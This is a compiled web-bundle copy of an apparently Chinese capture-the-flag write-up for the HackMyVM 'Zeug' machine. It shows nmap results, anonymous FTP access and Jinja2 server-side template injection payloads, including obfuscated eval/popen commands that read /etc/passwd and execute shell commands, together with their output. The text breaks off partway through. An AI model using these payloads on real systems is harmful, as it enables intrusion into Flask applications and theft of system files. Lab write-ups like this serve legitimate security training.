"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[9990],{70130:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>a,default:()=>p,frontMatter:()=>i,metadata:()=>r,toc:()=>c});const r=JSON.parse('{"id":"HackMyVM/Machines/Zeug/index","title":"Zeug","description":"[Linux VM] [Tested on VirtualBox] created by || c4rta","source":"@site/docs/HackMyVM/Machines/Zeug/index.md","sourceDirName":"HackMyVM/Machines/Zeug","slug":"/HackMyVM/Machines/Zeug/","permalink":"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Zeug/","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackMyVM/Machines/Zeug/index.md","tags":[],"version":"current","frontMatter":{},"sidebar":"HackMyVM_Sidebar","previous":{"title":"Zday","permalink":"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Zday/"}}');var o=t(74848),s=t(28453);const i={},a="Zeug",l={},c=[{value:"\u9776\u673a\u542f\u52a8",id:"\u9776\u673a\u542f\u52a8",level:2},{value:"nmap \u4fe1\u606f\u626b\u63cf",id:"nmap-\u4fe1\u606f\u626b\u63cf",level:2},{value:"ftp Anonymous",id:"ftp-anonymous",level:2},{value:"Python Werkzeug Debug Console",id:"python-werkzeug-debug-console",level:2},{value:"SSTI \u6784\u5efa\u653b\u51fb exp",id:"ssti-\u6784\u5efa\u653b\u51fb-exp",level:3},{value:"\u8bfb\u53d6\u73af\u5883\u4fe1\u606f",id:"\u8bfb\u53d6\u73af\u5883\u4fe1\u606f",level:3},{value:"\u76f4\u63a5\u5229\u7528 popen \u6784\u5efa\u547d\u4ee4\u6267\u884c\u53cd\u5f39 shell",id:"\u76f4\u63a5\u5229\u7528-popen-\u6784\u5efa\u547d\u4ee4\u6267\u884c\u53cd\u5f39-shell",level:3},{value:"User - cosette",id:"user---cosette",level:2},{value:"\u4f2a\u968f\u673a\u653b\u51fb",id:"\u4f2a\u968f\u673a\u653b\u51fb",level:3},{value:"User - exia",id:"user---exia",level:2},{value:"flag - user",id:"flag---user",level:3},{value:"\u52a8\u6001\u5e93\u6267\u884c\u4ee3\u7801\u6ce8\u5165",id:"\u52a8\u6001\u5e93\u6267\u884c\u4ee3\u7801\u6ce8\u5165",level:3},{value:"User - root",id:"user---root",level:2},{value:"flag - root",id:"flag---root",level:3}];function u(e){const n={admonition:"admonition",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",p:"p",pre:"pre",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",...(0,s.R)(),...e.components},{Details:t}=n;return t||function(e,n){throw new Error("Expected "+(n?"component":"object")+" `"+e+"` to be defined: you likely forgot to import, pass, or provide it.")}("Details",!0),(0,o.jsxs)(o.Fragment,{children:[(0,o.jsx)(n.header,{children:(0,o.jsx)(n.h1,{id:"zeug",children:"Zeug"})}),"\n",(0,o.jsxs)(n.admonition,{type:"note",children:[(0,o.jsx)(n.p,{children:"[Linux VM] [Tested on VirtualBox] created by || c4rta"}),(0,o.jsx)(n.p,{children:"\u23f2\ufe0f Release Date // 2024-02-05"}),(0,o.jsx)(n.p,{children:"\u2714\ufe0f MD5 // 6c34801ea5de49d8f7c5ff71c818e6f2"}),(0,o.jsx)(n.p,{children:"\u2620 Root // 4"}),(0,o.jsx)(n.p,{children:"\ud83d\udc80 User // 4"}),(0,o.jsxs)(n.p,{children:["\ud83d\udcddNotes //\nEnjoy it, you can do it ",":D"]})]}),"\n",(0,o.jsx)(n.h2,{id:"\u9776\u673a\u542f\u52a8",children:"\u9776\u673a\u542f\u52a8"}),"\n",(0,o.jsx)(n.p,{children:"\u9776\u673a IP\uff1a"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-plaintext",children:"192.168.56.122\n"})}),"\n",(0,o.jsx)(n.h2,{id:"nmap-\u4fe1\u606f\u626b\u63cf",children:"nmap \u4fe1\u606f\u626b\u63cf"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-plaintext",children:'Nmap scan report for 192.168.56.122 (192.168.56.122)\nHost is up (0.00036s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT     STATE SERVICE VERSION\n21/tcp   open  ftp     vsftpd 3.0.3\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n|_-rw-r--r--    1 0        0             109 Jan 06 23:14 README.txt\n| ftp-syst:\n|   STAT:\n| FTP server status:\n|      Connected to ::ffff:192.168.56.102\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 4\n|      vsFTPd 3.0.3 - secure, fast, stable\n|_End of status\n5000/tcp open  upnp?\n| fingerprint-strings:\n|   GetRequest:\n|     HTTP/1.1 200 OK\n|     Server: Werkzeug/3.0.1 Python/3.11.2\n|     Date: Tue, 06 Feb 2024 02:13:47 GMT\n|     Content-Type: text/html; charset=utf-8\n|     Content-Length: 549\n|     Connection: close\n|     <!DOCTYPE html>\n|     <html lang="en">\n|     <head>\n|     <meta charset="UTF-8">\n|     <meta name="viewport" content="width=device-width, initial-scale=1.0">\n|     <title>Zeug</title>\n|     <link rel="stylesheet" type="text/css" href="/static/styles/styles.css">\n|     </head>\n|     <body>\n|     <h1>Zeug</h1>\n|     <h3>Rendering HTML templates</h3>\n|     <form action="/" method="post" enctype="multipart/form-data">\n|     <input type="file" name="file" accept=".html" title="Select file" required>\n|     <input type="submit" value="Upload">\n|     </form>\n|     </body>\n|     </html>\n|   HTTPOptions:\n|     HTTP/1.1 200 OK\n|     Server: Werkzeug/3.0.1 Python/3.11.2\n|     Date: Tue, 06 Feb 2024 02:14:02 GMT\n|     Content-Type: text/html; charset=utf-8\n|     Allow: POST, GET, OPTIONS, HEAD\n|     Content-Length: 0\n|     Connection: close\n|   RTSPRequest:\n|     <!DOCTYPE HTML>\n|     <html lang="en">\n|     <head>\n|     <meta charset="utf-8">\n|     <title>Error response</title>\n|     </head>\n|     <body>\n|     <h1>Error response</h1>\n|     <p>Error code: 400</p>\n|     <p>Message: Bad request version (\'RTSP/1.0\').</p>\n|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>\n|     </body>\n|_    </html>\n'})}),"\n",(0,o.jsx)(n.h2,{id:"ftp-anonymous",children:"ftp Anonymous"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-plaintext",children:"Hi, Cosette, don't forget to disable the debug mode in the web application, we don't want security breaches.\n"})}),"\n",(0,o.jsx)(n.p,{children:"\u6839\u636e\u6307\u7eb9\u4fe1\u606f\uff0c\u731c\u6d4b\u4e3a Python Werkzeug \u6846\u67b6\u7684 Debug \u529f\u80fd"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-plaintext",children:"http://192.168.56.122:5000/console\n"})}),"\n",(0,o.jsx)(n.p,{children:"\u6b64\u8def\u52b2\u786e\u5b9e\u5b58\u5728 Python Werkzeug Debug Console"}),"\n",(0,o.jsx)(n.h2,{id:"python-werkzeug-debug-console",children:"Python Werkzeug Debug Console"}),"\n",(0,o.jsx)(n.p,{children:"\u5c1d\u8bd5\u8def\u5f84\u626b\u63cf\uff0c\u672a\u53d1\u73b0\u6709\u4ef7\u503c\u4fe1\u606f"}),"\n",(0,o.jsx)(n.p,{children:"Console \u754c\u9762\u65e0\u6cd5\u76f4\u63a5\u7a81\u7834"}),"\n",(0,o.jsx)(n.h3,{id:"ssti-\u6784\u5efa\u653b\u51fb-exp",children:"SSTI \u6784\u5efa\u653b\u51fb exp"}),"\n",(0,o.jsx)(n.p,{children:"\u5b58\u5728 SSTI \u6ce8\u5165"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-plaintext",metastring:'title="{{7+7}}"',children:"14\n"})}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-plaintext",metastring:'title="{{config.items()}}"',children:"dict_items([('DEBUG', True), ('TESTING', False), ('PROPAGATE_EXCEPTIONS', None), ('SECRET_KEY', None), ('PERMANENT_SESSION_LIFETIME', datetime.timedelta(days=31)), ('USE_X_SENDFILE', False), ('SERVER_NAME', None), ('APPLICATION_ROOT', '/'), ('SESSION_COOKIE_NAME', 'session'), ('SESSION_COOKIE_DOMAIN', None), ('SESSION_COOKIE_PATH', None), ('SESSION_COOKIE_HTTPONLY', True), ('SESSION_COOKIE_SECURE', False), ('SESSION_COOKIE_SAMESITE', None), ('SESSION_REFRESH_EACH_REQUEST', True), ('MAX_CONTENT_LENGTH', None), ('SEND_FILE_MAX_AGE_DEFAULT', None), ('TRAP_BAD_REQUEST_ERRORS', None), ('TRAP_HTTP_EXCEPTIONS', False), ('EXPLAIN_TEMPLATE_LOADING', False), ('PREFERRED_URL_SCHEME', 'http'), ('TEMPLATES_AUTO_RELOAD', None), ('MAX_COOKIE_SIZE', 4093)])\n"})}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-plaintext",metastring:'title="{{lipsum.__globals__}}"',children:"{'__name__': 'jinja2.utils', '__doc__': None, '__package__': 'jinja2', '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7facccf95f10>, '__spec__': ModuleSpec(name='jinja2.utils', loader=<_frozen_importlib_external.SourceFileLoader object at 0x7facccf95f10>, origin='/home/cosette/zeug/venv/lib/python3.11/site-packages/jinja2/utils.py'), '__file__': '/home/cosette/zeug/venv/lib/python3.11/site-packages/jinja2/utils.py', '__cached__': '/home/cosette/zeug/venv/lib/python3.11/site-packages/jinja2/__pycache__/utils.cpython-311.pyc', '__builtins__': {'__name__': 'builtins', '__doc__': \"Built-in functions, exceptions, and other objects.\\n\\nNoteworthy: None is the `nil' object; Ellipsis represents `...'in slices.\", '__package__': '','__loader__': <class'_frozen_importlib.BuiltinImporter'>,'__spec__': ModuleSpec(name='builtins', loader=<class'_frozen_importlib.BuiltinImporter'>, origin='built-in'),'__build_class__': <built-in function __build_class__>,'__import__': <built-in function __import__>,'abs': <built-in function abs>,'all': <built-in function all>,'any': <built-in function any>,'ascii': <built-in function ascii>,'bin': <built-in function bin>,'breakpoint': <built-in function breakpoint>,'callable': <built-in function callable>,'chr': <built-in function chr>,'compile': <built-in function compile>,'delattr': <built-in function delattr>,'dir': <built-in function dir>,'divmod': <built-in function divmod>,'eval': <built-in function eval>,'exec': <built-in function exec>,'format': <built-in function format>,'getattr': <built-in function getattr>,'globals': <built-in function globals>,'hasattr': <built-in function hasattr>,'hash': <built-in function hash>,'hex': <built-in function hex>,'id': <built-in function id>,'input': <built-in function input>,'isinstance': <built-in function isinstance>,'issubclass': <built-in function issubclass>,'iter': <built-in function iter>,'aiter': <built-in function aiter>,'len': <built-in function len>,'locals': <built-in function locals>,'max': <built-in function max>,'min': <built-in function min>,'next': <built-in function next>,'anext': <built-in function anext>,'oct': <built-in function oct>,'ord': <built-in function ord>,'pow': <built-in function pow>,'print': <built-in function print>,'repr': <built-in function repr>,'round': <built-in function round>,'setattr': <built-in function setattr>,'sorted': <built-in function sorted>,'sum': <built-in function sum>,'vars': <built-in function vars>,'None': None,'Ellipsis': Ellipsis,'NotImplemented': NotImplemented,'False': False,'True': True,'bool': <class'bool'>,'memoryview': <class'memoryview'>,'bytearray': <class'bytearray'>,'bytes': <class'bytes'>,'classmethod': <class'classmethod'>,'complex': <class'complex'>,'dict': <class'dict'>,'enumerate': <class'enumerate'>,'filter': <class'filter'>,'float': <class'float'>,'frozenset': <class'frozenset'>,'property': <class'property'>,'int': <class'int'>,'list': <class'list'>,'map': <class'map'>,'object': <class'object'>,'range': <class'range'>,'reversed': <class'reversed'>,'set': <class'set'>,'slice': <class'slice'>,'staticmethod': <class'staticmethod'>,'str': <class'str'>,'super': <class'super'>,'tuple': <class'tuple'>,'type': <class'type'>,'zip': <class'zip'>,'__debug__': True,'BaseException': <class'BaseException'>,'BaseExceptionGroup': <class'BaseExceptionGroup'>,'Exception': <class'Exception'>,'GeneratorExit': <class'GeneratorExit'>,'KeyboardInterrupt': <class'KeyboardInterrupt'>,'SystemExit': <class'SystemExit'>,'ArithmeticError': <class'ArithmeticError'>,'AssertionError': <class'AssertionError'>,'AttributeError': <class'AttributeError'>,'BufferError': <class'BufferError'>,'EOFError': <class'EOFError'>,'ImportError': <class'ImportError'>,'LookupError': <class'LookupError'>,'MemoryError': <class'MemoryError'>,'NameError': <class'NameError'>,'OSError': <class'OSError'>,'ReferenceError': <class'ReferenceError'>,'RuntimeError': <class'RuntimeError'>,'StopAsyncIteration': <class'StopAsyncIteration'>,'StopIteration': <class'StopIteration'>,'SyntaxError': <class'SyntaxError'>,'SystemError': <class'SystemError'>,'TypeError': <class'TypeError'>,'ValueError': <class'ValueError'>,'Warning': <class'Warning'>,'FloatingPointError': <class'FloatingPointError'>,'OverflowError': <class'OverflowError'>,'ZeroDivisionError': <class'ZeroDivisionError'>,'BytesWarning': <class'BytesWarning'>,'DeprecationWarning': <class'DeprecationWarning'>,'EncodingWarning': <class'EncodingWarning'>,'FutureWarning': <class'FutureWarning'>,'ImportWarning': <class'ImportWarning'>,'PendingDeprecationWarning': <class'PendingDeprecationWarning'>,'ResourceWarning': <class'ResourceWarning'>,'RuntimeWarning': <class'RuntimeWarning'>,'SyntaxWarning': <class'SyntaxWarning'>,'UnicodeWarning': <class'UnicodeWarning'>,'UserWarning': <class'UserWarning'>,'BlockingIOError': <class'BlockingIOError'>,'ChildProcessError': <class'ChildProcessError'>,'ConnectionError': <class'ConnectionError'>,'FileExistsError': <class'FileExistsError'>,'FileNotFoundError': <class'FileNotFoundError'>,'InterruptedError': <class'InterruptedError'>,'IsADirectoryError': <class'IsADirectoryError'>,'NotADirectoryError': <class'NotADirectoryError'>,'PermissionError': <class'PermissionError'>,'ProcessLookupError': <class'ProcessLookupError'>,'TimeoutError': <class'TimeoutError'>,'IndentationError': <class'IndentationError'>,'IndexError': <class'IndexError'>,'KeyError': <class'KeyError'>,'ModuleNotFoundError': <class'ModuleNotFoundError'>,'NotImplementedError': <class'NotImplementedError'>,'RecursionError': <class'RecursionError'>,'UnboundLocalError': <class'UnboundLocalError'>,'UnicodeError': <class'UnicodeError'>,'BrokenPipeError': <class'BrokenPipeError'>,'ConnectionAbortedError': <class'ConnectionAbortedError'>,'ConnectionRefusedError': <class'ConnectionRefusedError'>,'ConnectionResetError': <class'ConnectionResetError'>,'TabError': <class'TabError'>,'UnicodeDecodeError': <class'UnicodeDecodeError'>,'UnicodeEncodeError': <class'UnicodeEncodeError'>,'UnicodeTranslateError': <class'UnicodeTranslateError'>,'ExceptionGroup': <class'ExceptionGroup'>,'EnvironmentError': <class'OSError'>,'IOError': <class'OSError'>,'open': <built-in function open>,'quit': Use quit() or Ctrl-D (i.e. EOF) to exit,'exit': Use exit() or Ctrl-D (i.e. EOF) to exit,'copyright': Copyright (c) 2001-2023 Python Software Foundation. All Rights Reserved. Copyright (c) 2000 BeOpen.com. All Rights Reserved. Copyright (c) 1995-2001 Corporation for National Research Initiatives. All Rights Reserved. Copyright (c) 1991-1995 Stichting Mathematisch Centrum, Amsterdam. All Rights Reserved.,'credits': Thanks to CWI, CNRI, BeOpen.com, Zope Corporation and a cast of thousands for supporting Python development. See www.python.org for more information.,'license': Type license() to see the full license text,'help': Type help() for interactive help, or help(object) for help about object.},'__annotations__': {'missing': typing.Any,'internal_code': typing.MutableSet[code]},'enum': <module'enum'from'/usr/lib/python3.11/enum.py'>,'json': <module'json'from'/usr/lib/python3.11/json/__init__.py'>,'os': <module'os'(frozen)>,'re': <module're'from'/usr/lib/python3.11/re/__init__.py'>,'t': <module'typing'from'/usr/lib/python3.11/typing.py'>,'abc': <module'collections.abc'from'/usr/lib/python3.11/collections/abc.py'>,'deque': <class'collections.deque'>,'choice': <bound method Random.choice of <random.Random object at 0x17aedb0>>,'randrange': <bound method Random.randrange of <random.Random object at 0x17aedb0>>,'Lock': <built-in function allocate_lock>,'CodeType': <class'code'>,'quote_from_bytes': <function quote_from_bytes at 0x7faccdd60a40>,'markupsafe': <module'markupsafe'from'/home/cosette/zeug/venv/lib/python3.11/site-packages/markupsafe/__init__.py'>,'F': ~F,'missing': missing,'internal_code': {<code object __call__ at 0x7facccfc2500, file\"/home/cosette/zeug/venv/lib/python3.11/site-packages/jinja2/runtime.py\", line 566>, <code object call at 0x1a4eb60, file\"/home/cosette/zeug/venv/lib/python3.11/site-packages/jinja2/runtime.py\", line 260>, <code object __getattr__ at 0x7facccf62d30, file\"/home/cosette/zeug/venv/lib/python3.11/site-packages/jinja2/runtime.py\", line 854>, <code object parse at 0x7faccd145570, file\"/home/cosette/zeug/venv/lib/python3.11/site-packages/jinja2/environment.py\", line 593>, <code object get_or_select_template at 0x7facccf5cc30, file\"/home/cosette/zeug/venv/lib/python3.11/site-packages/jinja2/environment.py\", line 1066>, <code object load at 0x7facccff2030, file\"/home/cosette/zeug/venv/lib/python3.11/site-packages/jinja2/loaders.py\", line 107>, <code object select_template at 0x1ac9ec0, file\"/home/cosette/zeug/venv/lib/python3.11/site-packages/jinja2/environment.py\", line 1012>, <code object load at 0x7faccce883f0, file\"/home/cosette/zeug/venv/lib/python3.11/site-packages/jinja2/loaders.py\", line 563>, <code object _get_default_module at 0x7facccf90030, file\"/home/cosette/zeug/venv/lib/python3.11/site-packages/jinja2/environment.py\", line 1423>, <code object compile at 0x7faccd1a2b50, file\"/home/cosette/zeug/venv/lib/python3.11/site-packages/jinja2/environment.py\", line 728>, <code object _load_template at 0x1aed470, file\"/home/cosette/zeug/venv/lib/python3.11/site-packages/jinja2/environment.py\", line 950>, <code object load at 0x1ae8ad0, file\"/home/cosette/zeug/venv/lib/python3.11/site-packages/jinja2/loaders.py\", line 635>, <code object __call__ at 0x7faccd243b40, file\"/home/cosette/zeug/venv/lib/python3.11/site-packages/jinja2/runtime.py\", line 374>, <code object _fail_with_undefined_error at 0x7facccfb32d0, file\"/home/cosette/zeug/venv/lib/python3.11/site-packages/jinja2/runtime.py\", line 845>, <code object __call__ at 0x1b31a70, file\"/home/cosette/zeug/venv/lib/python3.11/site-packages/jinja2/runtime.py\", line 687>, <code object _async_call at 0x7facccf5ea30, file\"/home/cosette/zeug/venv/lib/python3.11/site-packages/jinja2/runtime.py\", line 363>, <code object get_template at 0x7faccd0b2a30, file\"/home/cosette/zeug/venv/lib/python3.11/site-packages/jinja2/environment.py\", line 975>, <code object load at 0x7faccd13fb50, file\"/home/cosette/zeug/venv/lib/python3.11/site-packages/jinja2/loaders.py\", line 513>},'concat': <built-in method join of str object at 0xa60e40>,'pass_context': <function pass_context at 0x7facccfa0400>,'pass_eval_context': <function pass_eval_context at 0x7facccfa0680>,'pass_environment': <function pass_environment at 0x7facccfa0720>,'_PassArg': <enum'_PassArg'>,'internalcode': <function internalcode at 0x7facccfa0900>,'is_undefined': <function is_undefined at 0x7facccfa0ae0>,'consume': <function consume at 0x7facccfa0b80>,'clear_caches': <function clear_caches at 0x7facccfa0c20>,'import_string': <function import_string at 0x7facccfa0cc0>,'open_if_exists': <function open_if_exists at 0x7facccfa0d60>,'object_type_repr': <function object_type_repr at 0x7facccfa0e00>,'pformat': <function pformat at 0x7facccfa0ea0>,'_http_re': re.compile('\\n ^\\n (\\n (https?://|www\\\\.) # scheme or www\\n (([\\\\w%-]+\\\\.)+)? # subdomain\\n (\\n [a-z]{2,63} # basic tld\\n |\\n xn--[\\\\w%]{2,59} # idna t, re.IGNORECASE|re.VERBOSE), '_email_re': re.compile('^\\\\S+@\\\\w[\\\\w.-]*\\\\.\\\\w+$'), 'urlize': <function urlize at 0x7facccfa0f40>, 'generate_lorem_ipsum': <function generate_lorem_ipsum at 0x7facccfa0fe0>, 'url_quote': <function url_quote at 0x7facccfa1080>, 'LRUCache': <class 'jinja2.utils.LRUCache'>, 'select_autoescape': <function select_autoescape at 0x7facccfa1120>, 'htmlsafe_json_dumps': <function htmlsafe_json_dumps at 0x7facccfa1e40>, 'Cycler': <class 'jinja2.utils.Cycler'>, 'Joiner': <class 'jinja2.utils.Joiner'>, 'Namespace': <class 'jinja2.utils.Namespace'>}\n"})}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-plaintext",metastring:'title="{{lipsum.__globals__.__builtins__}}"',children:"{'__name__': 'builtins', '__doc__': \"Built-in functions, exceptions, and other objects.\\n\\nNoteworthy: None is the `nil' object; Ellipsis represents `...'in slices.\", '__package__': '','__loader__': <class'_frozen_importlib.BuiltinImporter'>,'__spec__': ModuleSpec(name='builtins', loader=<class'_frozen_importlib.BuiltinImporter'>, origin='built-in'),'__build_class__': <built-in function __build_class__>,'__import__': <built-in function __import__>,'abs': <built-in function abs>,'all': <built-in function all>,'any': <built-in function any>,'ascii': <built-in function ascii>,'bin': <built-in function bin>,'breakpoint': <built-in function breakpoint>,'callable': <built-in function callable>,'chr': <built-in function chr>,'compile': <built-in function compile>,'delattr': <built-in function delattr>,'dir': <built-in function dir>,'divmod': <built-in function divmod>,'eval': <built-in function eval>,'exec': <built-in function exec>,'format': <built-in function format>,'getattr': <built-in function getattr>,'globals': <built-in function globals>,'hasattr': <built-in function hasattr>,'hash': <built-in function hash>,'hex': <built-in function hex>,'id': <built-in function id>,'input': <built-in function input>,'isinstance': <built-in function isinstance>,'issubclass': <built-in function issubclass>,'iter': <built-in function iter>,'aiter': <built-in function aiter>,'len': <built-in function len>,'locals': <built-in function locals>,'max': <built-in function max>,'min': <built-in function min>,'next': <built-in function next>,'anext': <built-in function anext>,'oct': <built-in function oct>,'ord': <built-in function ord>,'pow': <built-in function pow>,'print': <built-in function print>,'repr': <built-in function repr>,'round': <built-in function round>,'setattr': <built-in function setattr>,'sorted': <built-in function sorted>,'sum': <built-in function sum>,'vars': <built-in function vars>,'None': None,'Ellipsis': Ellipsis,'NotImplemented': NotImplemented,'False': False,'True': True,'bool': <class'bool'>,'memoryview': <class'memoryview'>,'bytearray': <class'bytearray'>,'bytes': <class'bytes'>,'classmethod': <class'classmethod'>,'complex': <class'complex'>,'dict': <class'dict'>,'enumerate': <class'enumerate'>,'filter': <class'filter'>,'float': <class'float'>,'frozenset': <class'frozenset'>,'property': <class'property'>,'int': <class'int'>,'list': <class'list'>,'map': <class'map'>,'object': <class'object'>,'range': <class'range'>,'reversed': <class'reversed'>,'set': <class'set'>,'slice': <class'slice'>,'staticmethod': <class'staticmethod'>,'str': <class'str'>,'super': <class'super'>,'tuple': <class'tuple'>,'type': <class'type'>,'zip': <class'zip'>,'__debug__': True,'BaseException': <class'BaseException'>,'BaseExceptionGroup': <class'BaseExceptionGroup'>,'Exception': <class'Exception'>,'GeneratorExit': <class'GeneratorExit'>,'KeyboardInterrupt': <class'KeyboardInterrupt'>,'SystemExit': <class'SystemExit'>,'ArithmeticError': <class'ArithmeticError'>,'AssertionError': <class'AssertionError'>,'AttributeError': <class'AttributeError'>,'BufferError': <class'BufferError'>,'EOFError': <class'EOFError'>,'ImportError': <class'ImportError'>,'LookupError': <class'LookupError'>,'MemoryError': <class'MemoryError'>,'NameError': <class'NameError'>,'OSError': <class'OSError'>,'ReferenceError': <class'ReferenceError'>,'RuntimeError': <class'RuntimeError'>,'StopAsyncIteration': <class'StopAsyncIteration'>,'StopIteration': <class'StopIteration'>,'SyntaxError': <class'SyntaxError'>,'SystemError': <class'SystemError'>,'TypeError': <class'TypeError'>,'ValueError': <class'ValueError'>,'Warning': <class'Warning'>,'FloatingPointError': <class'FloatingPointError'>,'OverflowError': <class'OverflowError'>,'ZeroDivisionError': <class'ZeroDivisionError'>,'BytesWarning': <class'BytesWarning'>,'DeprecationWarning': <class'DeprecationWarning'>,'EncodingWarning': <class'EncodingWarning'>,'FutureWarning': <class'FutureWarning'>,'ImportWarning': <class'ImportWarning'>,'PendingDeprecationWarning': <class'PendingDeprecationWarning'>,'ResourceWarning': <class'ResourceWarning'>,'RuntimeWarning': <class'RuntimeWarning'>,'SyntaxWarning': <class'SyntaxWarning'>,'UnicodeWarning': <class'UnicodeWarning'>,'UserWarning': <class'UserWarning'>,'BlockingIOError': <class'BlockingIOError'>,'ChildProcessError': <class'ChildProcessError'>,'ConnectionError': <class'ConnectionError'>,'FileExistsError': <class'FileExistsError'>,'FileNotFoundError': <class'FileNotFoundError'>,'InterruptedError': <class'InterruptedError'>,'IsADirectoryError': <class'IsADirectoryError'>,'NotADirectoryError': <class'NotADirectoryError'>,'PermissionError': <class'PermissionError'>,'ProcessLookupError': <class'ProcessLookupError'>,'TimeoutError': <class'TimeoutError'>,'IndentationError': <class'IndentationError'>,'IndexError': <class'IndexError'>,'KeyError': <class'KeyError'>,'ModuleNotFoundError': <class'ModuleNotFoundError'>,'NotImplementedError': <class'NotImplementedError'>,'RecursionError': <class'RecursionError'>,'UnboundLocalError': <class'UnboundLocalError'>,'UnicodeError': <class'UnicodeError'>,'BrokenPipeError': <class'BrokenPipeError'>,'ConnectionAbortedError': <class'ConnectionAbortedError'>,'ConnectionRefusedError': <class'ConnectionRefusedError'>,'ConnectionResetError': <class'ConnectionResetError'>,'TabError': <class'TabError'>,'UnicodeDecodeError': <class'UnicodeDecodeError'>,'UnicodeEncodeError': <class'UnicodeEncodeError'>,'UnicodeTranslateError': <class'UnicodeTranslateError'>,'ExceptionGroup': <class'ExceptionGroup'>,'EnvironmentError': <class'OSError'>,'IOError': <class'OSError'>,'open': <built-in function open>,'quit': Use quit() or Ctrl-D (i.e. EOF) to exit,'exit': Use exit() or Ctrl-D (i.e. EOF) to exit,'copyright': Copyright (c) 2001-2023 Python Software Foundation. All Rights Reserved. Copyright (c) 2000 BeOpen.com. All Rights Reserved. Copyright (c) 1995-2001 Corporation for National Research Initiatives. All Rights Reserved. Copyright (c) 1991-1995 Stichting Mathematisch Centrum, Amsterdam. All Rights Reserved.,'credits': Thanks to CWI, CNRI, BeOpen.com, Zope Corporation and a cast of thousands for supporting Python development. See www.python.org for more information.,'license': Type license() to see the full license text,'help': Type help() for interactive help, or help(object) for help about object.}\n"})}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-plaintext",metastring:'title="/etc/passwd"',children:'# {{lipsum.__globals__.__builtins__.open("/etc/passwd").read()}}\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing\nList Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:998:998:systemd\nNetwork Management:/:/usr/sbin/nologin\nmessagebus:x:100:107::/nonexistent:/usr/sbin/nologin\navahi-autoipd:x:101:108:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin\ncosette:x:1001:1001::/home/cosette:/bin/bash\nexia:x:1002:1002::/home/exia:/bin/bash\nftp:x:103:112:ftp\ndaemon,,,:/srv/ftp:/usr/sbin/nologin\n'})}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-plaintext",metastring:'title="ls /"',children:'# {{lipsum.__globals__.__builtins__.eval("__impo"+"rt__(\\"o"+"s\\").po"+"pen(\\"ls -lh /\\").read()")}}\ntotal 60K\nlrwxrwxrwx 1 root root 7 Jan 6 12:09 bin -> usr/bin\ndrwxr-xr-x 3 root root 4.0K Jan 6 13:50 boot\ndrwxr-xr-x 17 root root 3.3K Feb 6 02:39 dev\ndrwxr-xr-x 70 root root 4.0K Jan 7 13:13 etc\ndrwxr-xr-x 4 root root 4.0K Jan 6 19:28 home\nlrwxrwxrwx 1 root root 30 Jan 6 13:28 initrd.img -> boot/initrd.img-6.1.0-17-amd64\nlrwxrwxrwx 1 root root 30 Jan 6 13:01 initrd.img.old -> boot/initrd.img-6.1.0-15-amd64\nlrwxrwxrwx 1 root root 7 Jan 6 12:09 lib -> usr/lib\nlrwxrwxrwx 1 root root 9 Jan 6 12:09 lib64 -> usr/lib64\ndrwx------ 2 root root 16K Jan 6 12:09 lost+found\ndrwxr-xr-x 3 root root 4.0K Jan 6 12:09 media\ndrwxr-xr-x 2 root root 4.0K Jan 6 12:09 mnt\ndrwxr-xr-x 2 root root 4.0K Jan 6 23:29 opt\ndr-xr-xr-x 127 root root 0 Feb 6 02:39 proc\ndrwx------ 4 root root 4.0K Jan 6 23:52 root\ndrwxr-xr-x 18 root root 500 Feb 6 02:39 run\nlrwxrwxrwx 1 root root 8 Jan 6 12:09 sbin -> usr/sbin\ndrwxr-xr-x 3 root root 4.0K Jan 6 23:09 srv\ndr-xr-xr-x 13 root root 0 Feb 6 02:39 sys\ndrwxrwxrwt 7 root root 4.0K Feb 6 02:39 tmp\ndrwxr-xr-x 12 root root 4.0K Jan 6 12:09 